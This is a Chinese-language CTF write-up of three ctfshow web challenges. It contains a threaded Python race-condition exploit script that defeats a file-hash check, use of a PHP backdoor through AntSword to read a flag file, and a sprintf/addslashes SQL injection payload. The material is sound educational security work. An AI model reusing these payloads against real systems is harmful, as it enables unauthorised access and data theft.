#### 红包题第六弹

==**对网上搜寻的题解进行一些勘误**==

实际上有fastcoll生成的相同的MD5值的文件仍然绕不过第一层的md5_file，因为新生成的两个文件的md5值才相同，而与源文件不同，**本题实际考察的是条件竞争**，通过并发编程实现先后两层的绕过

##### 信息收集

首先有hint提示，不是SQL注入，可以发现源码，于是使用dirmap扫描出来有网站备份文件，解压后，代码如下：

```php
function receiveStreamFile($receiveFile){
 
    $streamData = isset($GLOBALS['HTTP_RAW_POST_DATA'])? $GLOBALS['HTTP_RAW_POST_DATA'] : '';
 
    if(empty($streamData)){
        $streamData = file_get_contents('php://input');
    }
    if($streamData!=''){
        $ret = file_put_contents($receiveFile, $streamData, true);
    }else{
        $ret = false;
    }
    return $ret;
}
if(md5(date("i")) === $token){
	
	$receiveFile = 'flag.dat';
	receiveStreamFile($receiveFile);
	if(md5_file($receiveFile)===md5_file("key.dat")){
		if(hash_file("sha512",$receiveFile)!=hash_file("sha512","key.dat")){
			$ret['success']="1";
			$ret['msg']="人脸识别成功!$flag";
			$ret['error']="0";
			echo json_encode($ret);
			return;
		}

			$ret['errormsg']="same file";
			echo json_encode($ret);
			return;
	}
			$ret['errormsg']="md5 error";
			echo json_encode($ret);
			return;
} 

$ret['errormsg']="token error";
echo json_encode($ret);
return;
```

##### 阅读源码

首先有一个对token的判断，于是我们抓包看看，

![](D:\0-CTF\Documents\WP\images\ctfshow_红包题6_1.jpg)

发现确实有一个token，是对当前日期做了一个MD5的编码，可以用python实现，然后设置了一个receivefile为flag.dat，然后调用`receiveStreamFile($receiveFile);`，可以发现是需要用php://input获取文件流，然后返回一个文件，接下来需要自己传上去的文件与已存在的`key.dat`的MD5要一致，sha512不一致，即可打印出flag

##### 解题

那么我们的思路是，首先获得key.dat，首先访问一下这个文件，emmm，果然直接下载了，那么第一层的绕过我们直接就使用了`key.dat`文件，第二层的sha1值我们随便上传一个字符串即可，所以我们需要**并发编程，将$receiveFile中的内容在极短时间内进行替换**，这里我们可以编写一个python脚本来进行解题。

payload:

```python
import requests
import time
import hashlib
import threading

#这里为什么用分钟数生成：因为通过抓包发现改变分钟后token值才会变化
i=str(time.localtime().tm_min)
#生成token
m=hashlib.md5(i.encode()).hexdigest()
url="http://063e4649-b8da-4090-8a6b-da6b11fa5f07.challenge.ctf.show/check.php?token={}&php://input".format(m)

def POST(data):
    try:
        r=requests.post(url,data=data)
        if "ctfshow" in r.text:
            print(r.text)
            pass
        # print(r.text)
        pass
    except Exception as e:
        print("somthing went wrong!")
        pass
    pass

with open('key.dat','rb') as t:
    data1=t.read()
    pass
for i in range(50):
    threading.Thread(target=POST,args=(data1,)).start()
for i in range(50):
    data2='emmmmm'
    threading.Thread(target=POST,args=(data2,)).start()
```

得出：

```
{"success":"1","msg":"\u4eba\u8138\u8bc6\u522b\u6210\u529f!ctfshow{6f98bbcc-82e2-4c3e-a46e-0a8f8ad403cd}","error":"0","errormsg":""}
```



#### 红包题第七弹

##### 信息收集

一开始进去就是一个phpinfo的页面，发现disable_function了一些函数，猜测会用到shell命令，但是没有多余的信息，于是使用dirmap扫描，发现有.git文件，直接访问得到403，无果，可能存在git泄露。

##### 解题

于是尝试获取源码，先后使用Git Hack和Git_Extract获取，Githack只获取到了存在index.php和backdoor.php两个文件名，另一个获取到了源码，如下：

![](D:\0-CTF\Documents\WP\images\ctfshow_红包题7_1.jpg)

得到Letmein后门，于是用中国蚁剑连接，发现读取不了文件，果然是disable_function在起作用，那么我们再使用一下插件，发现也打不开，emmm，那就手工吧，现在是蚁剑已经获取到了文件目录，在`var/www/flag.txt`可能存在flag，于是我使用如下payload:

`Letmain=print_r(highlight_file("var/www/flag.txt"))`，成功解题



#### 萌新赛-给她

##### 信息收集

进去是一个SQL语句展示，emmm，那就写几句SQL注入看看，抓包，用字典FUZZ，一个没出，发现单引号都被转义了，猜测后台是有一个`addslashes`函数，那么我们可以联想到`sprintf`函数与`addslashes`函数连用造成的逻辑漏洞，但是不确定，目录扫描可不能少，扫一下，发现有git，直接访问报403，那用GitHack拉取一下，发现`hint.php`

![](D:\0-CTF\Documents\WP\images\ctfshow_给她_1.jpg)

发现确实如我们所想，存在sprintf函数

##### sprintf函数的底层逻辑漏洞

由于该函数的底层逻辑上只对15中占位符有分支，而其他的则直接没处理，而造成的被替换为空字符，如：

```php
<?php
$sql="select * from user where username='%\' and 1=1 #';";
$user='admin';
echo sprintf($sql,$user);
?>
//打印出来：select * from user where username='' and 1=1 #';
```

**可被替换为空的占位符：`%\`,`%1$\`**

##### 解题

那么我可以构造如下payload：`name=admin&pass=1%1$'or 1=1%23`

在后台应该是：`select * from user where name ='admin' and pass='1'or 1=1#'`

返回了一个报错页面，发现不是原生的报错，check一下源码：

![](D:\0-CTF\Documents\WP\images\ctfshow_给她_2.jpg)

发现存在hint，那么文件位置我们已经知晓，下面就是如何读取文件，首先想到的是用load_file函数，但是没搞出来，然后无意间抓了一个包，好家伙，**cookie里竟然藏了一个file**，抓出来转16进制，得到`flag.txt`，那么我们放入`/flag`的16进制进去`2f666c6167`，放包，得到flag：`ctfshow{9cd199ec-f7ef-41e0-9a1f-234d9ab5628d}`

![](D:\0-CTF\Documents\WP\images\ctfshow_给她_3.jpg)
